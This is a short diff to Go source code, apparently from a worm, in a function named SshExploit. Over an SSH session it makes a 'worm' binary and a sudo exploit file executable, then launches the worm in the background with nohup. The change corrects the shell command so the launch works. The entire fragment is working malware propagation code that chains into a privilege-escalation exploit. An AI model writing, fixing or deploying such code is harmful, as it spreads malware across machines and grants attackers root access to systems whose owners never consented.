@@ -163,9 +163,9 @@ func SshExploit(ip string) string {
 	defer session.Close()
 
 	session.CombinedOutput(
-		"nohup \"chmod u+x " + worm_dir + "/worm && " +
-		"chmod u+x " + worm_dir + "/" + sudo_exploit_filename + " && " +
-		"" + worm_dir + "/worm\" &")
+		"chmod u+x " + worm_dir + "/worm && " +
+		"chmod u+x " + worm_dir + "/" + sudo_exploit_filename + "; " +
+		"nohup " + worm_dir + "/worm &")
 
 	return "Finished exploiting"
 }
